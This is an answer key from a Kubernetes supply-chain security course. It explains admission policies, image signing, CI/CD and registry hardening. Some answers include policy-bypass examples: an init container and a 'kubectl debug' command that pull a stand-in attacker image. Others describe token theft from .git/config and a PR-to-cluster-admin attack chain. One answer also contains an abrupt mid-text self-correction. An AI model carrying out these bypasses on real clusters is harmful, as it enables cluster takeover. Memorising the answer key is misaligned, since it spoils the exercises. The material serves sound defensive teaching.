**A7.1** The policy matches on `Pods`, and `kubectl create deployment` creates a **Deployment**, not a Pod. The Deployment is admitted successfully; the deployment controller then creates a ReplicaSet (also admitted); the ReplicaSet controller then attempts to create a Pod, and *that* request is denied. Because the denial happens asynchronously in a controller loop, `kubectl` has long since returned 0 — the user sees a Deployment stuck at `0/1` and must dig into `kubectl describe rs` to find the `FailedCreate` event. In a CI pipeline this is much worse: `kubectl apply` succeeds, the pipeline reports green, and the failure surfaces only in monitoring.

To make it fail at apply time, **extend `matchConstraints` to cover the pod-template-carrying workload resources** and read the image list from `object.spec.template.spec` for those kinds:

```yaml
  matchConstraints:
    resourceRules:
    - apiGroups: ["apps"]
      apiVersions: ["v1"]
      operations: ["CREATE", "UPDATE"]
      resources: ["deployments", "statefulsets", "daemonsets", "replicasets"]
    - apiGroups: ["batch"]
      apiVersions: ["v1"]
      operations: ["CREATE", "UPDATE"]
      resources: ["jobs", "cronjobs"]
    - apiGroups: [""]
      apiVersions: ["v1"]
      operations: ["CREATE", "UPDATE"]
      resources: ["pods"]
```

with a variable that locates the pod spec regardless of kind:

```yaml
  - name: podSpec
    expression: >-
      has(object.spec.template) ? object.spec.template.spec :
      (has(object.spec.jobTemplate) ? object.spec.jobTemplate.spec.template.spec : object.spec)
```

Keep the Pod rule as well — it is the backstop that catches bare pods and anything created by a controller you did not enumerate. Fail-fast on the workload resource is a **usability** control; the Pod rule is the **security** control.

**A7.2** The one-line bypass: put the image in an **init container**.

```yaml
spec:
  initContainers:
  - {name: pull, image: docker.io/attacker/evil:v1, command: ["/bin/sh","-c","..."]}
  containers:
  - {name: app, image: localhost:5000/healthz@sha256:4d1e...}
```

Init containers run to completion *before* the app containers, with the same volumes, the same ServiceAccount token and the same network namespace — a full-privilege execution slot the policy never looked at. (A sidecar — an init container with `restartPolicy: Always` — is the same bypass but keeps running alongside the app.)

The subresource bypass: **ephemeral containers**, injected via `kubectl debug`:

```bash
kubectl -n supply debug -it good --image=docker.io/attacker/evil:v1 --target=app
```

This is doubly dangerous because ephemeral containers are added through the `pods/ephemeralcontainers` **subresource** — an `UPDATE` on a subresource, not a `CREATE` on `pods`. A `resourceRules` entry listing only `resources: ["pods"]` does not match it; you need `resources: ["pods/ephemeralcontainers"]` explicitly (and the object shape differs, so the CEL must handle it). Many production policies that correctly handle init containers still miss this one. The same class of oversight applies to `pods/exec` for other kinds of policy.

**A7.3** For a `ValidatingWebhookConfiguration`, `failurePolicy: Fail` means "if the **external HTTP call** to the webhook fails — the pod is down, the network is partitioned, the TLS cert expired, the timeout elapsed — deny the request." The availability of an entire class of API operations is coupled to the availability of a separate in-cluster (or out-of-cluster) service, which is precisely the deadlock discussed in A6.2 and A8.3.

For a `ValidatingAdmissionPolicy`, the evaluation is **in-process in the API server**: CEL is compiled and evaluated inside the API server itself. There is no network call, no service to be down, no TLS to expire, no timeout to trip. `failurePolicy: Fail` here covers a much narrower set of conditions — chiefly runtime CEL evaluation errors (type errors on unexpected object shapes, cost-limit exhaustion, division by zero).

So the availability risk is categorically lower: a VAP cannot be made unavailable by workload or network failure, and it survives a cold cluster start with no bootstrap ordering problem. That, plus the absence of a component to operate and certificates to rotate, is the main practical reason to express in-CEL-expressible policy as VAP and reserve webhooks for what genuinely needs them (A8.2). The remaining risk is different in kind: a CEL expression that throws on an object shape you did not anticipate will, with `failurePolicy: Fail`, deny that request — which is why the `has()` guards on `initContainers`/`ephemeralContainers` in step 1 matter, and why you roll out with an `Audit` binding first.

**A7.4** **For the exclusion:** `kube-system` holds the control plane's own static pods and mirror pods, the CNI, CSI drivers, CoreDNS and kube-proxy — components that must start before anything else and whose images come from `registry.k8s.io` or a vendor registry, not from your application registry. Including them means either the cluster cannot bootstrap at all, or you must maintain the union of every system image prefix in the policy and update it on every Kubernetes upgrade and every CNI/CSI change. During an incident, an operator often needs to run a debug pod from an arbitrary image on a control plane node; a hard deny in `kube-system` removes that option at the worst moment.

**Against it:** `kube-system` is the **highest-value namespace in the cluster**. Pods there frequently run with host network, host PID, privileged security contexts, hostPath mounts of the node filesystem, and ServiceAccounts with sweeping permissions. An attacker who can create a pod in `kube-system` — via a compromised operator, an over-broad RBAC grant, or a controller with `create pods` cluster-wide — now faces no image restriction at all, and can pull an arbitrary image straight to a control plane node. You have exempted exactly the place where the control matters most.

The reconciliation: exempt `kube-system` from the **registry allow-list** only if you must, but (a) replace the exemption with a *broader* allow-list rather than no policy — list `registry.k8s.io/`, your vendor registries and your internal mirror explicitly; (b) keep the digest-pinning rule enforced there; (c) tightly restrict who can create pods in `kube-system` via RBAC, which is the real control; and (d) keep an `Audit`+`Warn` binding with no namespace exclusion, so that even where you do not deny, you have a log of every system image that would have failed policy.

**A7.5** `Deny` and `Audit` are not redundant because they produce **different artifacts**. `Deny` rejects the request and returns an error to the client — the caller sees it, but nothing durable is recorded that a security team can query later. `Audit` adds an annotation (`validation.policy.admission.k8s.io/validation_failure`) to the **API server audit log** entry for that request, capturing the policy name, binding, the failed expression's message, the requesting user, and the full request context.

Using both gives you: enforcement *and* a durable, centrally shipped, queryable record of every enforcement event. That record is what lets you answer "who has been trying to deploy images from unapproved registries, and how often?" — which distinguishes a developer who has not updated their manifests from an attacker probing your controls. Without `Audit`, denials exist only as transient error strings in someone's terminal or a CI log that rotates away.

The related pairing is `Warn`, which returns the message as a `Warning:` header shown by `kubectl` without blocking. `["Audit", "Warn"]` is the standard **shadow-mode** rollout (step 7): users are told, security sees the volume, nothing breaks. Once the audit log shows the violation rate near zero, you flip to `["Deny", "Audit"]`.

---

### Block 8 — signature verification at admission

**A8.1** `mutateDigest: true` closes the gap between **the moment the policy verified an image** and **the moment the kubelet pulls it**.

Without it, the flow is: the pod says `healthz:slim` → Kyverno resolves that tag to digest D, verifies D's signature, allows the pod → the pod spec still says `healthz:slim` → some seconds, minutes or (on a later restart) months later, the kubelet resolves `healthz:slim` again. If the tag was moved in between — Exercise 4, exactly — the kubelet pulls digest D′, which was never verified and may have no signature at all. The verification was performed on one artifact and the guarantee was silently transferred to another. Worse, this recurs on every restart, reschedule and scale-up, forever, with the policy reporting success each time.

With `mutateDigest: true`, Kyverno **rewrites the pod spec** to the digest it verified before admitting it. The persisted object names an immutable artifact, so the kubelet can only pull the exact bytes that were verified, now and on every future restart. As a bonus, the running workload becomes self-documenting for audit (A4.1 / A11.1).

The general principle: any policy that checks a mutable reference must either pin it or re-check at use time. Kubernetes gives you no hook at pull time, so pinning at admission is the only option.

**A8.2** Because signature verification is not a **decision about the object being admitted** — it is a decision requiring **external I/O and cryptography**:
- It must **fetch** additional artifacts from the registry (the `.sig` and `.att` objects, the certificate chain), which means authenticated outbound network calls with registry credentials.
- It must perform **cryptographic verification**: ECDSA/RSA signature validation, certificate chain validation against Fulcio roots, and Rekor inclusion-proof checking.
- It may need to **query a transparency log** over the network.

CEL in a `ValidatingAdmissionPolicy` runs in-process in the API server under a strict cost budget, is deliberately **side-effect free and non-Turing-complete**, and has no network access, no crypto primitives and no registry client. This is by design — it is what makes VAP safe to run in the API server's hot path (A7.3). The moment a policy needs to talk to something outside the request, it needs a webhook.

The practical split: use `ValidatingAdmissionPolicy` for everything decidable from the object itself (registry prefixes, digest pinning, `securityContext` fields, label requirements, resource limits) and a webhook controller for signature and attestation verification. Running both is the normal production configuration — VAP as the cheap, always-available baseline that cannot be knocked out by a workload failure, plus the webhook for cryptographic assertions.

**A8.3** The deadlock: on a cold cluster start, the kubelet starts the control plane static pods, and the API server comes up and loads the `MutatingWebhookConfiguration`/`ValidatingWebhookConfiguration` objects from etcd. With `failurePolicy: Fail`, every pod creation must now be approved by the Kyverno service — but Kyverno's own pods have not started yet, so the API server's call to `kyverno-svc` fails, so the pod creations are denied, **including Kyverno's own pods**. Nothing can ever start. The same happens if all Kyverno replicas are evicted simultaneously, if the node running them fails and the replacement pods cannot be admitted, or if a NetworkPolicy change severs the API server → webhook path.

The two standard mitigations:
1. **Namespace and object exclusions.** The webhook configuration must exempt the namespace Kyverno itself runs in, plus `kube-system` and the namespaces of critical infrastructure (CNI, CSI, DNS), via `namespaceSelector`/`objectSelector`. Kyverno ships this by default — its Helm chart injects an exclusion for its own namespace and for `kube-system` — and the classic self-inflicted outage is an operator "hardening" the config by removing them.
2. **High availability plus scheduling guarantees**, so the webhook is never entirely absent: ≥3 replicas, hard pod anti-affinity across nodes, a `PodDisruptionBudget`, `priorityClassName: system-cluster-critical` so it is scheduled and never preempted, and tolerations that let it run on control plane nodes.

A third, complementary practice: set a short `webhookTimeoutSeconds` with `failurePolicy: Ignore` on *non-critical* rules while keeping `Fail` only on the rules that must not be bypassed — accepting a smaller blast radius rather than an all-or-nothing choice. And always keep the break-glass procedure documented: `kubectl delete validatingwebhookconfiguration ...` from a control-plane node, which requires the API server to be reachable — one more reason to exempt `kube-system`.

**A8.4** **No, it is not verified.** `localhost:5000/healthz*` is a glob, and `healthzevil` matches the `healthz` prefix followed by `evil` — wait, more precisely: the glob *does* match `localhost:5000/healthzevil:v1`, so the policy *would* apply to it, and since the attacker's image is unsigned it would be **rejected**. The dangerous case is the mirror image of this, and it is the one that matters: a glob that is too *narrow*, or an image reference that does not match the pattern at all, is **silently not evaluated** — `verifyImages` rules only apply to references they match, and an unmatched image is admitted with no verification whatsoever.

So the real trap is `imageReferences: ["localhost:5000/healthz*"]` combined with an attacker deploying `docker.io/attacker/evil:v1` — which matches nothing, triggers no rule, and is admitted unverified. The policy that looks like "we verify signatures" actually means "we verify signatures on images whose names we happened to list."

The lesson about globs: **write image-reference policy as default-deny, not default-allow.** Match broadly (`"*"`) and carve out exceptions explicitly, rather than matching narrowly and hoping the list is complete. Combine with the Exercise 7 registry allow-list so that anything not from an approved registry is rejected before signature verification is even relevant — the two policies compose into "only approved registries, and everything from them must be signed." Also prefer anchored, delimiter-aware patterns (`localhost:5000/healthz:*` or `localhost:5000/healthz@*`) over bare prefix globs, since `*` happily crosses the `:`/`/` boundaries a human reader assumes it respects.

**A8.5** A signed image can still be malicious because a signature attests to **provenance of approval, not to safety of contents** (cf. A5.5). Concretely: the signing key or workflow identity can be compromised; a legitimate builder can be compromised and sign a backdoored artifact; a malicious or coerced insider with signing rights can sign deliberately; a dependency pulled during a legitimate build can be malicious, producing an honestly-signed image containing someone else's backdoor; and an image signed legitimately last year may contain a vulnerability discovered since.

The control that addresses the residual risk is **runtime security** — the assumption that admission-time controls will eventually be bypassed, so behaviour must be monitored where the code actually executes. In practice: a runtime threat-detection tool consuming syscall events (Falco, Tetragon, or an eBPF-based EDR) alerting on process execution, outbound connections and file writes that do not match the workload's profile; combined with the runtime hardening that limits what a compromised process can do at all — `readOnlyRootFilesystem`, dropped capabilities, `runAsNonRoot`, seccomp `RuntimeDefault`, AppArmor/SELinux profiles, restrictive NetworkPolicies (default-deny egress in particular), and least-privilege ServiceAccounts.

The complementary control on the supply-chain side is **continuous re-evaluation**: re-scanning the shipped, signed SBOMs against a current vulnerability database (A3.4) so that "signed and verified" does not calcify into "trusted forever."

---

### Block 9 — CI/CD hardening

**A9.1** The direct analogue is **Exercise 4** — digest pinning of container images. A Git tag on a third-party GitHub Action is mutable exactly as an OCI tag is: the action's owner (or anyone who compromises their account) can move `v4` to point at a new commit, and every workflow referencing `@v4` executes the new code on its next run, with full access to the job's secrets, `id-token`, and registry push credentials — without a single line changing in your repository.

The shared principle: **reference immutable content by its cryptographic identity, never by a mutable, third-party-controlled label.** A digest and a commit SHA are content-addressed and cannot be re-pointed; a tag and a branch are pointers whose target is controlled by someone else. This is the same failure mode at every layer of the chain — base images, action versions, Helm chart versions, package `^1.2.0` ranges — and it is why the `tj-actions/changed-files` style of compromise, where a widely-used action's tags were repointed at malicious code, propagated to tens of thousands of repositories within hours.

**A9.2** By default, `actions/checkout` writes the job's `GITHUB_TOKEN` into `.git/config` as an `http.extraheader` credential so subsequent `git` commands in the job can authenticate. That credential then sits **in a file on disk, inside the build context**.

The specific escalation it prevents: the job runs `docker build` on attacker-influenceable files. A `Dockerfile` (or a `.dockerignore` change, or a build script the Dockerfile invokes) contributed via a pull request can simply `COPY .git/config /tmp/` — or run `RUN cat /.git/config` — and exfiltrate the token to an attacker-controlled endpoint, or write it into a layer of the published image. The same applies to any `RUN` step, any `make` target, any `npm` lifecycle script, any test the job executes: all of them can read the repository working directory, and therefore the credential.

With `persist-credentials: false`, the checkout uses the token for the fetch and then removes it; nothing durable is left on disk for the rest of the job to steal. Combined with the workflow-level `permissions: contents: read` default, even a stolen token would be read-only rather than push-capable — defence in depth, since a push-capable token in a build job means an attacker can commit directly to the repository and thereby own every future build.

**A9.3** Signing the tag creates a **time-of-check / time-of-use race between the push and the signature** — the CI-side version of A8.1.

The sequence: the build step pushes the image and tags it `ghcr.io/acme/healthz:v1.4.2`, producing digest D. The workflow then runs `cosign sign ghcr.io/acme/healthz:v1.4.2` as a separate step. Between those two steps, an attacker with registry write access — a leaked robot credential, a compromised parallel job, a second workflow triggered on the same tag, or a malicious fork build that shares registry access — pushes their own image and moves `v1.4.2` to digest D′. `cosign sign` then resolves the tag, finds D′, and **signs the attacker's image with your legitimate key**. The signature is valid, verification passes, and admission control admits it. Your own pipeline has laundered the attacker's artifact.

Signing `steps.build.outputs.digest` removes the race entirely: the value is captured at push time by the build step itself, and a digest cannot be repointed. The same reasoning applies to every downstream step — the SBOM generation and the attestation in that workflow also key off `steps.build.outputs.digest`, not the tag, so the inventory, the signature and the artifact are all provably about the same bytes.

**A9.4** Assuming PR builds run with the `ci:deployer` ServiceAccount that holds `cluster-admin`:

1. **Attacker opens a pull request** against the repository from a fork. No review is required for CI to run in many default configurations (`pull_request_target`, or a self-hosted runner configured to build PRs).
2. **The PR modifies a file the build executes** — the `Dockerfile`, a `Makefile` target, a test file, an `npm` `postinstall` script, or a workflow step's inline `run:` block. Arbitrary code now executes on the runner with the job's full environment.
3. **The attacker's code reads the ServiceAccount credential** — the mounted token at `/var/run/secrets/kubernetes.io/serviceaccount/token` if the runner is itself a pod, or the kubeconfig/`KUBE_TOKEN` secret injected into the job.
4. **The token is `cluster-admin`.** The attacker now has full control of the cluster from the runner, or can exfiltrate the token and use it from anywhere the API server is reachable.
5. **Persistence and expansion**: create a privileged DaemonSet with `hostPID: true` and a `hostPath` mount of `/`, obtaining root on every node; read every Secret in every namespace, including cloud credentials, database passwords and the registry push credentials; create a new ClusterRoleBinding for a ServiceAccount they control so access survives the token's rotation; and — closing the loop — use the stolen registry credentials to poison images consumed by other clusters (A9.3, A10.1).

The compounding failures: PR builds should not have deployment credentials at all (build and deploy must be separate jobs with separate identities, and deploy should run only from a protected branch or tag with environment protection rules); the deploy identity should be namespace-scoped and verb-limited (step 6); runners executing untrusted code must be ephemeral and isolated; and the cluster credential should be a short-lived OIDC-federated token rather than a static secret (step 7).

**A9.5** Two properties gained by `kubectl create token --duration=10m`:
1. **Bounded lifetime.** The token expires. A credential leaked into a build log, a core dump, an error report or an exfiltrated environment dump is worthless minutes later, which collapses the window between compromise and containment and makes offline cracking or later reuse impossible. A legacy `kubernetes.io/service-account-token` Secret has **no expiry at all** — it is valid until the Secret or ServiceAccount is deleted, which in practice means forever.
2. **No credential at rest, and audience/object binding.** The token is never persisted in etcd as a Secret, so it is not readable by anyone with `get secrets` in that namespace, not captured in an etcd backup, and not exposed through a Secret-listing vulnerability. It is issued by the TokenRequest API with an `aud` claim (and optionally bound to a specific object via `--bound-object-kind`/`--bound-object-name`), so it cannot be replayed against a different audience, and a pod-bound token is invalidated automatically when that pod is deleted. Bound tokens also carry the identity into the audit log more precisely.

The operational thing it breaks: **there is no longer a stable, long-lived credential to hand to an external system.** Anything that expects to be configured once with a static token — a CI platform's Kubernetes integration, a third-party dashboard, a monitoring agent outside the cluster, a `kubeconfig` file on someone's laptop — now needs a **refresh mechanism**: it must call the TokenRequest API before expiry and rotate the credential in place. In-cluster workloads get this for free (the kubelet projects and rotates the token via a `serviceAccountToken` projected volume), but external consumers need either an exec-credential plugin, OIDC/workload-identity federation, or a small rotation job. Teams that skip that work invariably regress to a long-lived Secret, so plan the refresh path before removing the static token.

---

### Block 10 — artifact repositories

**A10.1** A leaked **pull-only** credential is a **confidentiality** breach: the attacker can download and inspect your private images — reading proprietary source, embedded configuration, and any secrets careless builds baked into layers (a genuinely common finding; `trivy image --scanners secret` exists for a reason). They can enumerate your repositories and tags, learning your internal architecture and version history, which is excellent reconnaissance. But they cannot change what anyone runs.

A leaked **push-capable** credential is an **integrity** breach and is categorically worse: the attacker can overwrite mutable tags (Exercise 4), so every node that pulls afterwards runs their code — silently, with no Kubernetes object changing and no alert firing. They can push a malicious image under a plausible new tag; they can delete artifacts to cause outages; and if signatures are stored in the same repository as OCI artifacts, they may be able to delete or overwrite `.sig`/`.att` objects. In effect, one leaked push credential grants **arbitrary code execution on every workload that consumes that repository**, across every cluster and every environment, with the compromise appearing to originate from your own trusted registry.

Hence the rules: robot accounts scoped to a single project with a single verb; the cluster's `imagePullSecret` is always pull-only and never the CI account; push credentials exist only in the release job, never in PR builds (A9.4); and the registry enforces immutable tags so even a stolen push credential cannot rewrite history.

**A10.2** `AlwaysPullImages` mutates every pod's `imagePullPolicy` to `Always` at admission, forcing the kubelet to contact the registry — and therefore to **authenticate** — on every container start.

The attack it stops is **cross-tenant reuse of node-cached private images** (A4.3): without it, any user who can create a pod on a node can run any image previously pulled to that node, regardless of whether their namespace holds credentials for that registry. It also, as a side effect, eliminates the stale-cache non-determinism of A4.2, ensuring all replicas of a tagged workload converge on the same digest.

The two operational costs:
1. **Latency and registry load.** Every container start becomes a registry round trip. Even when all layers are cached and only the manifest is fetched, this adds startup latency and multiplies registry requests by pod-churn rate — significant for large clusters, for CronJobs, and for CrashLoopBackOff pods hammering the registry on every restart.
2. **A hard dependency on registry availability.** If the registry is down, unreachable, rate-limiting (Docker Hub's anonymous pull limits are a classic production incident), or the credential has expired, **pods cannot start** — including during a node failure or cluster recovery, exactly when you most need them to. You have converted a soft dependency into a hard one, and made the registry a control-plane-critical component requiring its own HA and monitoring. Mitigate with a pull-through cache mirror (step 6) that is itself highly available.

**A10.3** Beyond registry choice, an unqualified name such as `nginx:1.27` is risky because the name is **resolved by the container runtime's configuration, not by the manifest**. The manifest does not say where the image comes from; the runtime appends a default. Consequences:

- **The resolution differs by runtime and by node.** Docker and containerd default to `docker.io/library/`, but `containerd`'s `registry.mirrors`, CRI-O's `unqualified-search-registries` in `/etc/containers/registries.conf`, and Podman's search list can be configured to resolve unqualified names against a different registry entirely — and that configuration lives on the node, editable by anyone with node access. **The same manifest can pull different images on different nodes**, and an attacker with node-level access can silently redirect every unqualified image pull to a registry they control.
- **It defeats registry allow-listing.** A policy matching on prefixes (Exercise 7) sees the literal string `nginx:1.27`, which matches no approved prefix and would be denied — good — but a policy written to allow `docker.io/` will *not* match it either, so naive allow-lists both over- and under-match. Requiring fully-qualified names is a prerequisite for any registry policy to be meaningful.
- **Typosquatting and namespace confusion.** `nginx` resolves to the *official* `library/nginx`, but `ngnix`, or a name that today resolves to an official image and tomorrow to a user-namespaced one, does not. Unqualified names hide which namespace on which registry is actually being trusted.
- **Uncontrolled internet egress.** It implies nodes reach Docker Hub directly, exposing you to rate limits, availability outside your control, and an egress path that bypasses your mirror and its scanning policies.

The control is to require fully-qualified, digest-pinned references in policy — which the Exercise 7 rules already do, since `nginx:1.27` matches no allowed prefix and contains no `@sha256:`.

**A10.4** They protect against the same attack at **different points in the chain, under different threat models**.

- **Digest pinning** is a *consumer-side* control living in your manifests. It protects you even if the registry is fully compromised or misconfigured, because you are no longer asking the registry to resolve a name — you are demanding specific bytes, and the runtime verifies the content hash on pull. But it only protects workloads whose manifests are actually pinned.
- **Immutable tag rules** are a *producer-side* control living in the registry. They stop the mutation from ever happening, protecting every consumer — including those you do not control, those with unpinned manifests, and developers running `docker pull` on laptops.

Implement both because each covers the other's gap. Digest pinning does nothing for the many references that are not pinned (third-party Helm charts, a colleague's `kubectl run`, a CI job's base image in a `FROM` line). Immutable tags do nothing if the attacker pushes a *new* tag and social-engineers or automates its adoption, and nothing against a compromised registry or a MITM.

The one that protects you when a developer bypasses the pipeline is the **immutable tag rule** — it is enforced server-side by the registry, so it applies regardless of who is pushing, from where, with what tooling, and with what discipline. Digest pinning is a convention that requires everyone to follow it; immutability is a property that does not.

**A10.5** You created **a single upstream chokepoint whose compromise poisons every image in the cluster**. If the proxy cache registry is compromised — or merely misconfigured, or its cache is poisoned — an attacker can serve modified layers for `registry.k8s.io/kube-proxy`, for your base images, for everything, and every node accepts them because the registry is the trusted source and no node has an independent path to compare against. You have also made it a hard availability dependency (A10.2) and a high-value target concentrating credentials for every upstream registry.

The compensating controls that keep it honest:
- **Digest pinning end to end** (A10.4). If manifests demand a specific digest, a compromised proxy cannot substitute different content: the runtime verifies the content hash against the requested digest and the pull fails. This is the strongest single answer — it makes the proxy untrusted-by-construction for content integrity.
- **Signature verification at admission** (Exercise 8) using keys or identities anchored *outside* the proxy, so content served by the mirror must still verify against the original publisher's signature. Sigstore-signed upstream images (`registry.k8s.io` images are signed) can be verified against the public Fulcio/Rekor roots regardless of which mirror delivered the bytes.
- **Harden and monitor the proxy itself**: treat it as control-plane-critical infrastructure — strict RBAC on who can push or configure it, immutable tags and content trust enabled, audit logging on every push and configuration change, and alerting on any write to a proxy-cached repository (a pull-through cache should never receive direct pushes; one that does is being poisoned).
- **Independent verification**: periodically compare digests served by the mirror against the upstream registry's digests for the same tags, from a host that has its own egress path, and alert on divergence.

---

### Block 11 — end-to-end tracing

**A11.1** Trust `.status.containerStatuses[].imageID`. It is the digest the kubelet **actually resolved and ran**, reported by the container runtime after the pull — a statement of fact about bytes on disk. `.spec.containers[].image` is a statement of *intent* recorded when the object was created, and when it contains a tag it is a mutable pointer (A4.1).

If the two disagree, the disagreement is itself the finding: it means the tag has moved since this pod started, so other pods of the same workload — created before or after the mutation, or on nodes with different cache state (A4.2) — may be running **different code under an identical spec**. During an incident that is exactly the signal you need: the spec tells you what someone meant to deploy, the status tells you what is executing, and the delta tells you a substitution occurred and roughly when.

Practical caveat: `imageID` formats vary by runtime (containerd typically reports `registry/repo@sha256:<manifest-digest>`; some runtimes report the *config* digest instead, and Docker historically reported `docker-pullable://…`). Normalize before comparing, and when the config digest is what you have, resolve it against the registry (`crane config`) rather than assuming it equals the manifest digest.

**A11.2** **Advantage:** it is fast, offline, and works for artifacts you can no longer reach. You need no registry access, no image pull, no running pod, and no rebuild — so you can re-answer the exposure question for thousands of images in seconds, including images that have been deleted from the registry, are in an air-gapped environment, or belong to a cluster you have lost access to. It is also **verifiable**: the SBOM came out of a signed attestation whose subject matches the digest, so the inventory is attributable and tamper-evident rather than being whatever a scanner happens to report today. This is what makes fleet-wide "am I affected by CVE-X?" a query rather than a project (A3.4).

**Limitation:** you are trusting the inventory as recorded at build time by one tool with one cataloger configuration — so **anything that tool missed is permanently invisible**. The vendored `busybox` from Exercise 2, statically linked libraries, files copied without package metadata, and anything added by a later `docker build` step the cataloger did not understand simply do not exist as far as this scan is concerned, and no amount of database updating will surface them. The stored SBOM also cannot reflect **runtime drift**: packages installed into a running container, files written to a writable root filesystem, or code loaded dynamically after start. And if the image was rebuilt and the tag repointed without a new attestation, you may be scanning the inventory of an artifact that is no longer running.

The correct posture is both: SBOM-based scanning for breadth and speed across the fleet, plus periodic direct re-scanning of live images (and runtime detection, A8.5) to catch what the recorded inventory cannot see.

**A11.3** The provenance is only a **claim signed by the builder**, so it is worth exactly as much as the builder's integrity and the strength of the link from commit to build. For `commit 9a1c7f0` to mean anything you additionally need:

- **A trustworthy, isolated builder whose identity is verifiable.** The provenance must be signed by a builder identity you can pin (`--certificate-identity-regexp` against a specific workflow file and ref, A5.2), running on infrastructure the requester cannot influence — otherwise anyone can produce a document asserting any commit. This is the substance of SLSA build levels: at L3 the build platform generates the provenance itself, and the build's inputs and environment are isolated from the user requesting the build.
- **Integrity of the commit and the branch it came from.** Branch protection and required review, so `9a1c7f0` reached the release ref through a controlled path; ideally **signed commits/tags** so the commit itself is attributable, and a protected tag so `v1.4.2` cannot be repointed at a different commit (the Git-layer version of A4.1).
- **A durable, tamper-evident record.** The Git history must not be force-pushable on that ref, and the repository must still exist — a provenance pointing at a commit that has been rewritten or deleted is unverifiable. A Rekor entry (A5.4) provides the trusted timestamp proving when the claim was made.
- **Reproducibility, ideally.** The strongest form of the claim is one you can independently check: rebuild from `9a1c7f0` under the same hermetic conditions and obtain the same digest.

Without these, "built from commit 9a1c7f0" is a self-assertion by whoever held the signing key — informative for debugging, worthless as evidence.

**A11.4** Almost certainly: **an image was deployed from outside your supply chain entirely** — pulled from a public or attacker-controlled registry, or side-loaded directly onto the node's container runtime (`crictl pull` / `ctr images import` / a `docker load` by someone with node access), which produces a digest that exists in no registry you operate and has no signature, no SBOM and no provenance because it never passed through your build system. This is the signature of either a compromised workload/operator with pod-create rights, or an operator bypassing the pipeline "just this once" during an incident.

Controls from the earlier exercises that would have prevented it:
- **Exercise 7 — `ValidatingAdmissionPolicy` registry allow-list plus mandatory digest pinning.** An image from an unapproved registry is rejected at admission outright; this is the cheapest and most robust control, needs no external component, and cannot be knocked out by a workload failure.
- **Exercise 8 — Kyverno `verifyImages` with `required: true` and `mutateDigest: true`.** Even an image from an approved registry is rejected unless a valid signature and attestation exist, and the admitted spec is rewritten to the verified digest so the guarantee survives restarts.
- **Exercise 10 — `AlwaysPullImages`, plus egress restriction to the internal registry/proxy.** Forces every container start to go through an authenticated registry pull, which defeats the side-loaded-onto-the-node variant: an image present only in the node's local cache can no longer be run, and the pull itself fails if the source is unreachable.
- **Supporting: RBAC.** Restrict who and what can create pods, especially in privileged namespaces (A7.4) and especially for operators and CI identities (A9.4) — the ability to create a pod anywhere is the precondition for all of this.

The order matters operationally: the VAP registry/digest rule is the always-on baseline, signature verification is the cryptographic assertion on top, `AlwaysPullImages` plus egress control closes the node-local bypass, and RBAC limits who gets to try.

</details>

---

## References

- CNCF, *Certified Kubernetes Security Specialist (CKS) Curriculum v1.34* — https://github.com/cncf/curriculum/raw/master/CKS_Curriculum%20v1.34.pdf
- Kubernetes, *Using Admission Controllers* (`ImagePolicyWebhook`, `AlwaysPullImages`, `NodeRestriction`) — https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/
- Kubernetes, *Validating Admission Policy* — https://kubernetes.io/docs/reference/access-authn-authz/validating-admission-policy/
- Kubernetes, *Common Expression Language in Kubernetes* — https://kubernetes.io/docs/reference/using-api/cel/
- Kubernetes, *Images* (pull policies, image pull secrets) — https://kubernetes.io/docs/concepts/containers/images/
- Kubernetes, *Pull an Image from a Private Registry* — https://kubernetes.io/docs/tasks/configure-pod-container/pull-image-private-registry/
- Kubernetes, *Service Account Token Volume Projection / TokenRequest* — https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/
- Kubernetes, *Auditing* — https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/
- Sigstore, *cosign documentation* — https://docs.sigstore.dev/cosign/signing/overview/
- Sigstore, *Rekor transparency log* — https://docs.sigstore.dev/logging/overview/
- in-toto, *Attestation specification* — https://github.com/in-toto/attestation/blob/main/spec/README.md
- SLSA, *Supply-chain Levels for Software Artifacts v1.0* — https://slsa.dev/spec/v1.0/levels
- Anchore, *Syft* — https://github.com/anchore/syft · *Grype* — https://github.com/anchore/grype
- Aqua Security, *Trivy documentation* — https://trivy.dev/latest/docs/
- SPDX, *Specification v2.3* — https://spdx.github.io/spdx-spec/v2.3/
- OWASP, *CycloneDX Specification* — https://cyclonedx.org/specification/overview/
- OpenVEX, *Specification* — https://github.com/openvex/spec
- Kyverno, *Verify Images* — https://kyverno.io/docs/writing-policies/verify-images/
- Sigstore, *Policy Controller* — https://docs.sigstore.dev/policy-controller/overview/
- Google, *Distroless container images* — https://github.com/GoogleContainerTools/distroless
- Docker, *Build attestations (provenance and SBOM)* — https://docs.docker.com/build/metadata/attestations/
- OpenSSF, *Security Scorecard* — https://github.com/ossf/scorecard
- GitHub, *Security hardening for GitHub Actions* — https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions